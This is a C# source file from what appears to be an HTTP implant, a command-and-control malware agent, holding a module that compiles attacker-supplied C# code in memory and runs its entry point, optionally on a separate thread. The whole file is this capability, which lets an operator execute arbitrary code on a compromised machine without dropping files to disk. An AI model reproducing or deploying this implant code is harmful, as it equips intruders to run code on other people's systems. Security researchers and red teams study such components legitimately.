using System;
using System.CodeDom.Compiler;
using Microsoft.CSharp;
using System.Reflection;
using System.Threading;
using System.Text;

namespace HTTPImplant.Modules
{
    public static class CompileAndRunNET
    {
        public static void ExecuteCS(string sharpcode, string arguments, bool wait)
        {
            try
            {
                Console.WriteLine("Starting compilation of source code.");
                Console.WriteLine("Compiled Source Code: \n" + sharpcode);

                CSharpCodeProvider provider = new CSharpCodeProvider();
                CompilerParameters parameters = new CompilerParameters
                {
                    ReferencedAssemblies = { "System.dll", "System.Windows.Forms.dll", "System.Windows.dll" },
                    GenerateInMemory = true,
                    GenerateExecutable = true,
                    IncludeDebugInformation = false
                };

                CompilerResults results = provider.CompileAssemblyFromSource(parameters, sharpcode);
                if (results.Errors.HasErrors)
                {
                    StringBuilder sb = new StringBuilder();

                    foreach (CompilerError error in results.Errors)
                    {
                        sb.AppendLine($"Error ({error.ErrorNumber}): {error.ErrorText}");
                    }

                    Console.WriteLine("Compilation failed with errors:");
                    Console.WriteLine(sb.ToString());
                    throw new InvalidOperationException(sb.ToString());
                }

                Console.WriteLine("Compilation successful. Executing code...");

                Assembly a = results.CompiledAssembly;
                MethodInfo method = a.EntryPoint;
                object o = a.CreateInstance(method.Name);

                if (wait)
                {
                    Console.WriteLine("Waiting for the assembly to finish...");
                    if (string.IsNullOrEmpty(arguments))
                    {
                        method.Invoke(o, null);
                    }
                    else
                    {
                        object[] ao = { arguments };
                        method.Invoke(o, ao);
                    }
                }
                else
                {
                    Console.WriteLine("Not waiting for the assembly to finish. Starting in a new thread...");
                    ThreadStart ths;
                    if (string.IsNullOrEmpty(arguments))
                    {
                        ths = new ThreadStart(() => method.Invoke(o, null));
                    }
                    else
                    {
                        object[] ao = { arguments };
                        ths = new ThreadStart(() => method.Invoke(o, ao));
                    }

                    Thread th = new Thread(ths);
                    th.Start();
                }

                Console.WriteLine("Execution process completed.");
            }
            catch (Exception ex)
            {
                Console.WriteLine("An error occurred: " + ex.Message);
            }
        }
    }
}
